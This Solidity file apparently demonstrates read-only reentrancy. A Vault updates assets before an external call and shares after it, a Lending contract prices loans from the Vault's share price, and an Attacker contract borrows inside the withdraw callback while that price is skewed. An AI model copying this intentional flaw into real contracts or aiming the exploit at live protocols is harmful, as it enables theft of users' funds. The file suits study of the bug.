pragma solidity ^0.8.0;

contract Vault {
    uint256 public assets;
    uint256 public shares;

    constructor() {
        assets = 1000 ether;
        shares = 1000 ether;
    }

    function withdraw(uint256 amt) external {
        require(assets >= amt);

        assets -= amt;	// assets is updated BEFORE the external call

        (bool ok,) = msg.sender.call("");
        require(ok);

        shares -= amt;	// shares is updated AFTER the external call, 
    }

    function pricePerShare() public view returns (uint256) {
        return assets * 1e18 / shares;
    }
}

contract Lending {
    Vault public immutable vault;

    mapping(address => uint256) public debt;

    constructor(address v) {
        vault = Vault(v);
    }

    function borrow() external {
        uint256 pps = vault.pricePerShare();
        uint256 amount = 1000 ether * 1e18 / pps;
        debt[msg.sender] += amount;
    }
}


contract Attacker {
    Vault public vault;
    Lending public lending;

    constructor(address v, address l) {
        vault = Vault(v);
        lending = Lending(l);
    }

    function attack() external {
        vault.withdraw(100 ether);
    }

    receive() external payable {
        lending.borrow();
    }
}